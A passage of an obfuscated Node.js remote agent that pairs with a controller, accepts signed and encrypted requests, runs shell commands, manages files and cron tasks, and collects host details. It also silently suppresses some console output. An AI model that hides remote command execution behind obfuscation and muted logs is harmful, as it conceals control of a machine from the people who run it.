#!/usr/bin/env node
const a0aQ = a0b;
(function (a, b) {
    const aP = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aP(0x71c)) / 0x1 + parseInt(aP(0x62a)) / 0x2 + parseInt(aP(0x319)) / 0x3 + -parseInt(aP(0x2ae)) / 0x4 * (parseInt(aP(0x55d)) / 0x5) + parseInt(aP(0x5d7)) / 0x6 * (-parseInt(aP(0x476)) / 0x7) + parseInt(aP(0x45e)) / 0x8 + -parseInt(aP(0x55a)) / 0x9 * (-parseInt(aP(0x7c3)) / 0xa);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xb673f));
const a0c = [
    a0aQ(0x5cf),
    'Failed\x20to\x20parse\x20URL\x20from',
    a0aQ(0x28d)
];
function a0d(a) {
    const aR = a0aQ, b = {
            'AhXkl': function (c, d) {
                return c === d;
            },
            'VvZgm': aR(0x858)
        };
    return function (c, d, f) {
        const aS = aR, g = c[aS(0x3e8)]();
        if (a0c['some'](h => g['includes'](h))) {
            if (b[aS(0x784)](typeof f, b[aS(0x50b)]))
                f();
            return !![];
        }
        return a[aS(0x2a2)](this, arguments);
    };
}
process[a0aQ(0x378)][a0aQ(0x1c7)] = a0d(process['stdout'][a0aQ(0x1c7)]), process[a0aQ(0x2e3)]['write'] = a0d(process[a0aQ(0x2e3)][a0aQ(0x1c7)]);
const a0f = require('express'), a0g = require(a0aQ(0x80f)), a0h = require(a0aQ(0x760)), a0i = require(a0aQ(0x4e3)), a0j = require('tls'), a0k = require(a0aQ(0x736)), a0l = require('fs'), a0m = require('fs')[a0aQ(0x790)], a0n = require(a0aQ(0x793)), a0o = require('os'), a0p = require('readline'), {
        exec: a0q,
        spawn: a0r
    } = require(a0aQ(0x50d)), a0s = require(a0aQ(0x888)), a0t = require(a0aQ(0x5a6)), {encrypt: a0u} = require('eciesjs'), a0v = require(a0aQ(0x2c7)), a0w = require(a0aQ(0x20a)), a0x = require(a0aQ(0x38b));
function a0y() {
    const aT = a0aQ, a = {
            'SFpmf': aT(0x7e7),
            'gWEIG': aT(0x592),
            'TgwEp': aT(0x81d),
            'tRgnY': function (b, c) {
                return b <= c;
            },
            'JXXqd': function (b, c) {
                return b + c;
            },
            'vPohu': function (b, c) {
                return b >= c;
            },
            'dyewj': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0n[aT(0x48d)](__dirname, a[aT(0x4f8)]);
        if (!a0l[aT(0x235)](b))
            return;
        for (let c of a0l['readFileSync'](b, a[aT(0x657)])['split'](/\r?\n/)) {
            let d = c[aT(0x777)]();
            if (!d || d[aT(0x86b)]('#'))
                continue;
            if (d[aT(0x86b)](a[aT(0x6ce)]))
                d = d['slice'](0x7)[aT(0x82c)]();
            const f = d['indexOf']('=');
            if (a[aT(0x750)](f, 0x0))
                continue;
            const g = d[aT(0x4a4)](0x0, f)[aT(0x777)]();
            let h = d[aT(0x4a4)](a['JXXqd'](f, 0x1))[aT(0x777)]();
            a[aT(0x722)](h['length'], 0x2) && (h[aT(0x86b)]('\x22') && h[aT(0x6fb)]('\x22') || h['startsWith']('\x27') && h[aT(0x6fb)]('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a[aT(0x82f)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0y();
let a0z, a0A, a0B;
try {
    typeof Bun !== a0aQ(0x744) ? a0B = require(a0aQ(0x78a)) : a0B = require(a0aQ(0x608));
} catch (a0aO) {
    console[a0aQ(0x484)](a0aQ(0x7af)), console[a0aQ(0x484)](a0aQ(0x4f5) + a0aO[a0aQ(0x346)]), console['error'](a0aQ(0x36f)), process[a0aQ(0x6e0)](0x1);
}
const a0C = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const aU = a0aQ, a = {
                'pWZCH': function (b, c) {
                    return b !== c;
                }
            };
        return a[aU(0x297)](typeof a0O, aU(0x744)) && a0O[aU(0x4c0)] !== undefined ? a0O[aU(0x4c0)] : 0x2;
    },
    'debug': a => {
        const aV = a0aQ, b = {
                'HmfXw': function (c, d) {
                    return c <= d;
                }
            };
        b[aV(0x3c1)](a0C[aV(0x3ad)], a0C[aV(0x504)][aV(0x590)]) && console[aV(0x6f7)](aV(0x2e6) + a);
    },
    'info': a => {
        const aW = a0aQ;
        a0C[aW(0x3ad)] <= a0C['LEVELS']['INFO'] && console[aW(0x6f7)](aW(0x7e3) + a);
    },
    'warn': a => {
        const aX = a0aQ;
        a0C[aX(0x3ad)] <= a0C[aX(0x504)][aX(0x355)] && console[aX(0x6f7)](aX(0x2df) + a);
    },
    'error': a => {
        const aY = a0aQ, b = {
                'tuRpk': function (c, d) {
                    return c <= d;
                }
            };
        b['tuRpk'](a0C[aY(0x3ad)], a0C[aY(0x504)][aY(0x64a)]) && console[aY(0x6f7)]('\x1b[31m[ERROR]\x1b[0m\x20' + a);
    }
};
function a0b(a, b) {
    a = a - 0x1c5;
    const c = a0a();
    let d = c[a];
    if (a0b['RWjaeE'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['gpkfxH'] = e, a0b['mueary'] = {}, a0b['RWjaeE'] = !![];
    }
    const f = c[0x0];
    a0b['CEuNmO'] !== f && (a0b['mueary'] = {}, a0b['CEuNmO'] = f);
    const g = a0b['mueary'][a];
    return g === undefined ? (d = a0b['gpkfxH'](d), a0b['mueary'][a] = d) : d = g, d;
}
function a0D() {
    const aZ = a0aQ, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0o[aZ(0x4dc)](),
            process[aZ(0x634)]()
        ];
    for (const b of a) {
        if (b && a0l['existsSync'](b) && a0l['statSync'](b)['isDirectory']())
            return b;
    }
    return process['cwd']();
}
function a0E() {
    const b0 = a0aQ;
    let a = null;
    try {
        a = a0o['homedir']();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l['existsSync'](d) && a0l[b0(0x1ce)](d)[b0(0x41b)]())
            return d;
        if (d)
            console['log'](b0(0x286) + d);
    }
    return console[b0(0x6f7)](b0(0x849) + process[b0(0x634)]()), process[b0(0x634)]();
}
class a0F {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0G extends a0F {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0H extends a0F {
    constructor() {
        const b1 = a0aQ;
        super(), this[b1(0x61c)] = '', this['cpu_cores'] = 0x0, this[b1(0x1eb)] = '', this[b1(0x353)] = 0x0, this[b1(0x552)] = '', this['ipv4'] = null, this['ipv6'] = null, this[b1(0x683)] = 0x0, this['os'] = '', this[b1(0x269)] = '', this[b1(0x48a)] = 0x0, this[b1(0x5c5)] = a0O[b1(0x3b7)], this[b1(0x419)] = '', this[b1(0x205)] = '', this['noise_key'] = null;
    }
}
class a0I extends a0F {
    constructor() {
        const b2 = a0aQ, a = { 'wrpQN': b2(0x71f) }, b = a['wrpQN'][b2(0x281)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['swap'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '1':
                this[b2(0x766)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '2':
                this['connections'] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '3':
                this[b2(0x346)] = '';
                continue;
            case '4':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '5':
                this[b2(0x4a3)] = { 'usage': 0x0 };
                continue;
            case '6':
                this[b2(0x83d)] = 0x0;
                continue;
            case '7':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '8':
                this[b2(0x228)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '9':
                super();
                continue;
            case '10':
                this[b2(0x434)] = 0x0;
                continue;
            }
            break;
        }
    }
}
class a0J extends a0F {
    constructor() {
        const b3 = a0aQ, a = { 'tgwES': b3(0x1d0) }, b = a['tgwES'][b3(0x281)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b3(0x7fa)] = ![];
                continue;
            case '1':
                this[b3(0x29d)] = 0x0;
                continue;
            case '2':
                this['result'] = '';
                continue;
            case '3':
                super();
                continue;
            case '4':
                this[b3(0x2d0)] = '';
                continue;
            }
            break;
        }
    }
}
class a0K {
    constructor() {
        const b4 = a0aQ, a = b4(0x537)[b4(0x281)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[b4(0x40c)] = 0x0;
                continue;
            case '1':
                this[b4(0x53a)] = '';
                continue;
            case '2':
                this['mode'] = '';
                continue;
            case '3':
                this['mode_octal'] = '';
                continue;
            case '4':
                this[b4(0x842)] = '';
                continue;
            case '5':
                this[b4(0x469)] = '';
                continue;
            case '6':
                this[b4(0x324)] = '';
                continue;
            case '7':
                this['path'] = '';
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const b5 = a0aQ, a = { 'uCzrp': b5(0x29c) }, b = a[b5(0x820)][b5(0x281)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['writable'] = ![];
                continue;
            case '1':
                this[b5(0x53a)] = '';
                continue;
            case '2':
                this[b5(0x737)] = ![];
                continue;
            case '3':
                this[b5(0x748)] = '';
                continue;
            case '4':
                this['path'] = '';
                continue;
            case '5':
                this[b5(0x842)] = '';
                continue;
            case '6':
                this[b5(0x7b8)] = '';
                continue;
            case '7':
                this[b5(0x4ab)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0M extends a0F {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0N {
    static [a0aQ(0x6bb)]() {
        const b6 = a0aQ, a = {
                'ZZdvY': b6(0x3a4),
                'pnUFt': b6(0x548),
                'ChqjD': 'base64url',
                'UqtCW': function (i, j) {
                    return i !== j;
                },
                'qWYTv': b6(0x63a)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[b6(0x46c)](a['ZZdvY']), d = b[b6(0x3af)]({ 'format': a[b6(0x285)] }), f = c[b6(0x3af)]({ 'format': a[b6(0x285)] }), g = Buffer[b6(0x45b)](d['d'], a['ChqjD']), h = Buffer[b6(0x45b)](f['x'], a[b6(0x7fd)]);
        return (g[b6(0x32c)] !== 0x20 || a[b6(0x7f4)](h[b6(0x32c)], 0x20)) && a0C[b6(0x484)]('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g[b6(0x3e8)](a[b6(0x2aa)]),
            'public_b64': h[b6(0x3e8)](a[b6(0x2aa)])
        };
    }
    static [a0aQ(0x59d)](a) {
        const b7 = a0aQ, b = this['_generateRawKeypair']();
        return {
            'role': a,
            'private_b64': b['private_b64'],
            'public_b64': b[b7(0x624)]
        };
    }
    static ['generatePair'](a = a0aQ(0x4dd), b = a0aQ(0x740)) {
        const b8 = a0aQ, c = {
                'control': this[b8(0x59d)](a),
                'agent': this[b8(0x59d)](b)
            };
        return c;
    }
}
class a0O {
    static [a0aQ(0x7df)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aQ(0x1f1)] = (process.env.EXEC_SHELL || 'true')[a0aQ(0x207)]() === a0aQ(0x27d);
    static [a0aQ(0x590)] = (process.env.DEBUG || a0aQ(0x2d9))[a0aQ(0x207)]() === a0aQ(0x27d);
    static ['TIMESTAMP_WINDOW'] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this[a0aQ(0x590)] ? '0' : '2'), 0xa);
    static [a0aQ(0x247)] = a0O[a0aQ(0x78d)]('ECDSA_PUBKEY', a0aQ(0x2b8)) || 'ECDSA公钥内容';
    static [a0aQ(0x68d)] = a0O[a0aQ(0x78d)](a0aQ(0x3f6), a0aQ(0x470)) || 'ECIES公钥内容';
    static [a0aQ(0x572)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static ['TEMPKEY_MAX_TTL_HOURS'] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aQ(0x490), 0xa);
    static [a0aQ(0x447)] = a0E();
    static [a0aQ(0x714)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aQ(0x74c));
    static [a0aQ(0x6da)] = (process.env.FOLLOW_SYMLINKS || 'false')[a0aQ(0x207)]() === 'true';
    static [a0aQ(0x315)] = (process.env.FILE_AUDIT_LOG || a0aQ(0x27d))[a0aQ(0x207)]() === 'true';
    static ['InitTask'] = !![];
    static [a0aQ(0x1de)] = [];
    static [a0aQ(0x3ff)] = {};
    static [a0aQ(0x4a8)] = ![];
    static [a0aQ(0x7d8)] = parseInt(process.env.TASK_TIMEOUT || a0aQ(0x1fc));
    static [a0aQ(0x30b)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aQ(0x5ef)] = [];
    static ['crontasks_log'] = [];
    static [a0aQ(0x6b3)] = parseInt(process.env.MAX_TASK_LOG || a0aQ(0x853));
    static [a0aQ(0x693)] = process.env.HOST || a0aQ(0x871);
    static [a0aQ(0x569)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aQ(0x4e2));
    static [a0aQ(0x61a)] = (process.env.KMODE || '0')[a0aQ(0x777)]() || '0';
    static ['KNAME'] = (process.env.KNAME || '')[a0aQ(0x777)]();
    static [a0aQ(0x875)] = (process.env.KNAME_KEY || '')[a0aQ(0x777)]();
    static [a0aQ(0x4fa)] = process.env.KPATH || '';
    static [a0aQ(0x3b7)] = process.env.AGENT_VERSION || a0aQ(0x651);
    static ['SESSION_KEY'] = a0k[a0aQ(0x1e7)](0x20)[a0aQ(0x3e8)](a0aQ(0x63a));
    static [a0aQ(0x6e4)] = a0N['generatePair']();
    static [a0aQ(0x2d4)]() {
        const b9 = a0aQ, a = {
                'rGJEZ': b9(0x63a),
                'hTChC': b9(0x5bd)
            };
        return a0k[b9(0x36d)]('sha256', Buffer[b9(0x45b)](this[b9(0x2f9)], a[b9(0x336)]))[b9(0x328)](a[b9(0x833)])[b9(0x769)](b9(0x63a));
    }
    static [a0aQ(0x806)]() {
        const ba = a0aQ, a = {
                'YoJbN': ba(0x63a),
                'gHkDr': ba(0x62e)
            }, b = a0N[ba(0x6f3)]();
        this['NOISE_KEYS_INTERNAL'][ba(0x270)] = b[ba(0x270)], this['NOISE_KEY']['controller']['private'] = b[ba(0x270)][ba(0x6f4)], this['SESSION_KEY'] = a0k[ba(0x1e7)](0x20)[ba(0x3e8)](a[ba(0x7e2)]), this[ba(0x5ea)] = null, this['_baseinfo_cache_time'] = 0x0, this[ba(0x570)] = null, this[ba(0x6b7)] = 0x0, a0C[ba(0x82d)](a[ba(0x36e)]);
    }
    static [a0aQ(0x38e)] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL'][a0aQ(0x270)][a0aQ(0x6f4)] },
        'agent': { 'public': this[a0aQ(0x6e4)][a0aQ(0x342)][a0aQ(0x624)] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static ['STATUS_CACHE_TTL'] = 0x1e;
    static ['_baseinfo_cache'] = null;
    static [a0aQ(0x4d8)] = 0x0;
    static [a0aQ(0x58f)] = null;
    static [a0aQ(0x570)] = null;
    static [a0aQ(0x6b7)] = 0x0;
    static [a0aQ(0x4ac)] = null;
    static [a0aQ(0x78d)](a, b) {
        const bb = a0aQ, c = { 'pdcxQ': bb(0x592) }, d = process.env[a];
        if (d)
            return d;
        const f = a0n[bb(0x48d)](__dirname, b);
        if (a0l[bb(0x235)](f))
            try {
                return a0l['readFileSync'](f, c['pdcxQ'])[bb(0x777)]();
            } catch (g) {
            }
        return '';
    }
    static ['validate']() {
        const bc = a0aQ, a = {
                'lYDVJ': bc(0x242),
                'xTAdU': bc(0x6b9),
                'sKtpJ': bc(0x79d),
                'ctpcb': '\x0a💡\x20解决方法:',
                'QwmSH': bc(0x2de),
                'UmQOi': bc(0x43a)
            };
        if (!this[bc(0x590)]) {
            const b = [];
            !this[bc(0x247)] && b[bc(0x381)](a[bc(0x5a5)]), !this[bc(0x68d)] && b[bc(0x381)](a['xTAdU']), b[bc(0x32c)] > 0x0 && (a0C[bc(0x484)](a['sKtpJ']), b[bc(0x29f)](c => a0C[bc(0x484)]('\x20\x20\x20•\x20' + c)), a0C[bc(0x4b3)](a['ctpcb']), a0C[bc(0x4b3)](a['QwmSH']), a0C[bc(0x4b3)](a[bc(0x80d)]), process[bc(0x6e0)](0x1));
        }
    }
    static [a0aQ(0x2a1)](a = {}) {
        const bd = a0aQ, b = {
                'TcJuV': function (c, d) {
                    return c !== d;
                },
                'ajQFG': function (c, d, f) {
                    return c(d, f);
                },
                'fGiQr': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[bd(0x77d)](a['PORT'], undefined) && b[bd(0x77d)](a['PORT'], null) && (this['PORT'] = b[bd(0x542)](parseInt, b[bd(0x85e)](String, a[bd(0x569)]), 0xa)), a[bd(0x247)] && (this['ECDSA_PUBLIC_KEY_PEM'] = a['ECDSA_PUBLIC_KEY_PEM'][bd(0x777)]()), a[bd(0x68d)] && (this[bd(0x68d)] = a[bd(0x68d)][bd(0x777)]());
    }
}
class a0P {
    constructor() {
        const be = a0aQ;
        this['_key'] = null, this[be(0x4cc)] = null;
    }
    ['getOrCreate'](a) {
        const bf = a0aQ, b = bf(0x895)[bf(0x281)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                if (this[bf(0x391)])
                    return this['_key'];
                continue;
            case '1':
                return this['_key'];
            case '2':
                this[bf(0x391)] = this['_generate'](a);
                continue;
            case '3':
                this[bf(0x703)]();
                continue;
            case '4':
                a0C[bf(0x524)](bf(0x71e) + this[bf(0x391)][bf(0x52e)] + bf(0x3dd) + a + '\x20小时');
                continue;
            }
            break;
        }
    }
    [a0aQ(0x676)]() {
        const bg = a0aQ;
        this['_expireCurrent']();
        if (this['_key'])
            return this[bg(0x391)][bg(0x1ff)];
        return null;
    }
    ['getActiveEciesPub']() {
        const bh = a0aQ;
        this[bh(0x703)]();
        if (this['_key'])
            return this[bh(0x391)][bh(0x573)];
        return null;
    }
    ['_expireCurrent']() {
        const bi = a0aQ, a = {
                'rBHDO': function (b, c) {
                    return b === c;
                },
                'lElqb': 'function'
            };
        if (this['_key'] && this[bi(0x47a)](this[bi(0x391)])) {
            const b = this['_key']['key_id'];
            this[bi(0x391)] = null, a0C['warn'](bi(0x786) + b);
            if (a['rBHDO'](typeof this[bi(0x4cc)], a[bi(0x59a)]))
                try {
                    this[bi(0x4cc)]();
                } catch (c) {
                    a0C[bi(0x484)](bi(0x6fe) + c['message']);
                }
        }
    }
    [a0aQ(0x47a)](a) {
        const bj = a0aQ, b = {
                'TqfFK': function (c, d) {
                    return c / d;
                }
            };
        return Math[bj(0x479)](b['TqfFK'](Date[bj(0x86c)](), 0x3e8)) >= a[bj(0x5a2)];
    }
    ['_generate'](a) {
        const bk = a0aQ, b = {
                'RwwFb': function (l, m) {
                    return l / m;
                },
                'UEHVV': function (l, m) {
                    return l * m;
                },
                'JcDLQ': bk(0x347),
                'VEtoq': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k['generateKeyPairSync']('ec', { 'namedCurve': 'prime256v1' }), f = c['export']({
                'type': bk(0x792),
                'format': bk(0x67f)
            }), g = d[bk(0x3af)]({
                'type': bk(0x261),
                'format': bk(0x67f)
            }), h = a0k[bk(0x1e7)](0x20), i = Buffer[bk(0x45b)](a0A[bk(0x279)](h, ![])), j = Math[bk(0x479)](b[bk(0x7f3)](Date[bk(0x86c)](), 0x3e8)), k = b[bk(0x6a4)](a, 0xe10);
        return {
            'key_id': a0k['randomBytes'](0x8)[bk(0x3e8)](b['JcDLQ']),
            'created_at': j,
            'expires_at': b[bk(0x443)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bk(0x3e8)](b[bk(0x45a)]),
            'ecies_public_key': i[bk(0x3e8)](b[bk(0x45a)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0Q {
    constructor(a, b) {
        const bl = a0aQ, c = {
                'EadnF': bl(0x6df),
                'mdIln': function (d, f) {
                    return d(f);
                },
                'EoDUx': 'P-256'
            };
        this[bl(0x69e)] = null, this[bl(0x589)] = null;
        if (a)
            try {
                const d = a[bl(0x777)]();
                if (d[bl(0x86b)](c['EadnF']))
                    this[bl(0x69e)] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer[bl(0x45b)](d, bl(0x63a)), g = a0z[bl(0x4f9)]['fromBytes'](f), h = g[bl(0x6d8)](![]), i = m => m[bl(0x3e8)](bl(0x63a))[bl(0x538)](/\+/g, '-')[bl(0x538)](/\//g, '_')[bl(0x538)](/=/g, ''), j = c[bl(0x367)](i, Buffer['from'](h[bl(0x4a4)](0x1, 0x21))), k = c[bl(0x367)](i, Buffer[bl(0x45b)](h[bl(0x4a4)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c['EoDUx'],
                            'x': j,
                            'y': k
                        };
                    this['ecdsaPubkey'] = a0k[bl(0x2a5)]({
                        'key': l,
                        'format': bl(0x548)
                    });
                }
            } catch (m) {
                a0C[bl(0x484)](bl(0x396) + m[bl(0x346)]), this[bl(0x69e)] = null;
            }
        if (b)
            try {
                this[bl(0x589)] = a0v[bl(0x5d2)](b[bl(0x777)]());
            } catch (n) {
                a0C[bl(0x82d)]('⚠️\x20ECIES公钥解码失败:\x20' + n['message']);
            }
    }
    ['verifySignature'](a, b, c, d, f, g, h = null) {
        const bm = a0aQ, i = {
                'TbtgU': 'ECDSA\x20public\x20key\x20not\x20loaded',
                'derfa': function (j, k) {
                    return j(k);
                },
                'nIMKT': function (j, k) {
                    return j / k;
                },
                'PKDRt': function (j, k) {
                    return j - k;
                },
                'Mctix': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'qAodK': bm(0x772),
                'gQVqI': 'temp',
                'BMxUP': bm(0x76d)
            };
        if (!this[bm(0x69e)])
            throw new Error(i['TbtgU']);
        try {
            const j = i[bm(0x5d5)](parseInt, f), k = Math[bm(0x479)](i[bm(0x32e)](Date[bm(0x86c)](), 0x3e8));
            if (Math['abs'](i[bm(0x283)](k, j)) > a0O[bm(0x3e1)])
                throw new Error(bm(0x4c4) + Math[bm(0x5d4)](k - j) + bm(0x72b) + a0O[bm(0x3e1)] + 's');
            const l = i[bm(0x81b)](a0R, a, b, c, d, f);
            if (this[bm(0x4b2)](this[bm(0x69e)], l, g))
                return i[bm(0x505)];
            if (h && this[bm(0x4b2)](h, l, g))
                return i[bm(0x33d)];
            throw new Error(i['BMxUP']);
        } catch (m) {
            throw new Error(bm(0x41c) + m[bm(0x346)]);
        }
    }
    [a0aQ(0x4b2)](a, b, c) {
        const bn = a0aQ, d = { 'lVNLn': 'SHA256' };
        if (!a)
            return ![];
        try {
            const f = a0v['toByteArray'](c), g = a0k['createVerify'](d[bn(0x550)]);
            return g[bn(0x328)](b), g['verify'](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aQ(0x460)](a, b = null) {
        const bo = a0aQ, c = {
                'oKfoH': function (d, f, g) {
                    return d(f, g);
                }
            };
        if (a0O['DEBUG'] || !this[bo(0x589)])
            return JSON[bo(0x656)](a);
        try {
            const d = JSON[bo(0x656)](a), f = Buffer[bo(0x45b)](d, bo(0x3fb)), g = b || Buffer[bo(0x45b)](this[bo(0x589)]), h = c['oKfoH'](a0u, g, f);
            return Buffer['from'](h)[bo(0x3e8)](bo(0x63a));
        } catch (i) {
            const j = {
                '_encrypt_error': i['message'],
                '_raw': a0O[bo(0x590)] ? a : null
            };
            return JSON[bo(0x656)](j);
        }
    }
    [a0aQ(0x692)](a, b) {
        const bp = a0aQ, c = {
                'LmMpa': function (d, f) {
                    return d !== f;
                },
                'IIAbX': bp(0x83f),
                'VlcsU': bp(0x63a),
                'IciXA': bp(0x592),
                'nFypT': 'Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.',
                'IlBcb': 'aes-256-gcm'
            };
        if (!b || c['LmMpa'](b[bp(0x32c)], 0x20))
            throw new Error(c[bp(0x22f)]);
        try {
            const d = Buffer[bp(0x45b)](a, c[bp(0x848)])[bp(0x3e8)](c[bp(0x4e5)]), f = JSON[bp(0x4d7)](d);
            if (!f[bp(0x3ef)] || !f[bp(0x86a)] || !f[bp(0x54f)])
                throw new Error(c[bp(0x65a)]);
            const g = Buffer[bp(0x45b)](f[bp(0x3ef)], c[bp(0x848)]), h = Buffer[bp(0x45b)](f[bp(0x86a)], c[bp(0x848)]), i = Buffer[bp(0x45b)](f[bp(0x54f)], c['VlcsU']), j = a0k['createDecipheriv'](c['IlBcb'], b, g);
            j[bp(0x70f)](h);
            let k = j[bp(0x328)](i, null, bp(0x592));
            return k += j[bp(0x5e1)](c['IciXA']), k;
        } catch (l) {
            throw new Error(bp(0x2a3) + l[bp(0x346)]);
        }
    }
}
function a0R(a, b, c, d, f) {
    const bq = a0aQ, g = {
            'IHXFg': bq(0x5f0),
            'EZHHm': bq(0x347)
        };
    return !c && (c = a0k[bq(0x2c6)](g[bq(0x23a)])[bq(0x328)](Buffer[bq(0x43b)](0x0))[bq(0x769)](g[bq(0x3cf)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0S(a, b = null) {
    const br = a0aQ, c = {
            'kxVdh': br(0x774),
            'vgcad': br(0x6ab),
            'oIDuz': br(0x77f),
            'vXXVg': br(0x63e),
            'DeqnY': br(0x27d),
            'HmIOf': br(0x592),
            'OMXeQ': br(0x2d9),
            'oAdCM': br(0x873),
            'dqUwh': function (d) {
                return d();
            },
            'LApSx': br(0x839),
            'IvQll': br(0x4f4),
            'ZZlAC': br(0x66c),
            'XjfRM': br(0x418),
            'vvhdi': br(0x51d),
            'eemXE': br(0x66d),
            'YgQDQ': function (d) {
                return d();
            },
            'tEDwy': 'utf-8',
            'wpfHl': function (d, f) {
                return d > f;
            },
            'pSbQU': br(0x5f0),
            'QiXyK': br(0x347),
            'fWbSu': function (d, f) {
                return d === f;
            },
            'RdjMp': br(0x772),
            'xxbbI': function (d) {
                return d();
            },
            'EcmXD': function (d, f) {
                return d === f;
            },
            'viNKU': 'x-aes-encrypted',
            'kEKyT': br(0x63a),
            'XbNwT': br(0x7fb),
            'UqTbP': function (d, f) {
                return d === f;
            },
            'sSSzb': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bs = br, h = {
                'fKQSL': c['kxVdh'],
                'JKfJs': c['vgcad'],
                'tdPLU': function (n, o) {
                    return n === o;
                },
                'QPUoW': c[bs(0x2c4)],
                'dbWpp': c['vXXVg'],
                'tKQIA': bs(0x824),
                'JIvMr': c[bs(0x517)],
                'iGxzy': bs(0x24a),
                'pVgOZ': c[bs(0x2ec)],
                'iFrVb': c[bs(0x403)]
            };
        if (d[bs(0x793)][bs(0x86b)](c['oAdCM']))
            return c['dqUwh'](g);
        if (d[bs(0x213)] === bs(0x496) || d[bs(0x213)] === bs(0x358))
            return g();
        d[bs(0x641)] = ![];
        const i = [
            c[bs(0x627)],
            c[bs(0x2f4)]
        ];
        if (a0O[bs(0x590)])
            return d[bs(0x641)] = !![], g();
        const j = d['headers'][bs(0x4f6)] || d[bs(0x74e)][c[bs(0x3be)]], k = d[bs(0x74e)][c[bs(0x449)]] || d[bs(0x74e)][c['vvhdi']], l = d['headers'][c[bs(0x7e9)]] || d[bs(0x74e)][bs(0x534)];
        if (!j || !k || !l)
            return i[bs(0x50f)](d['path']) ? c['YgQDQ'](g) : f[bs(0x765)](0x191)[bs(0x1d5)]({ 'error': 'Missing\x20auth\x20headers' });
        try {
            let n = Buffer[bs(0x43b)](0x0);
            if (d[bs(0x793)] !== bs(0x420)) {
                if (Buffer['isBuffer'](d[bs(0x554)]))
                    n = d[bs(0x554)];
                else {
                    if (typeof d[bs(0x554)] === bs(0x63e))
                        n = Buffer[bs(0x45b)](d[bs(0x554)], c[bs(0x72f)]);
                }
            }
            const o = c[bs(0x357)](n[bs(0x32c)], 0x0) ? a0k[bs(0x2c6)](c['pSbQU'])['update'](n)[bs(0x769)](c[bs(0x46b)]) : '', p = b ? b[bs(0x676)]() : null, q = a[bs(0x1ca)](d[bs(0x213)], d[bs(0x793)], o, j, k, l, p);
            d[bs(0x641)] = !![], d['key_source'] = c[bs(0x6c1)](q, c['oIDuz']) ? c[bs(0x2c4)] : c[bs(0x47e)];
        } catch (r) {
            return i[bs(0x50f)](d['path']) ? c[bs(0x6cc)](g) : f[bs(0x765)](0x191)[bs(0x1d5)]({ 'error': bs(0x41c) + r['message'] });
        }
        if (d[bs(0x554)] && c[bs(0x1e3)](typeof d[bs(0x554)], c['vXXVg'])) {
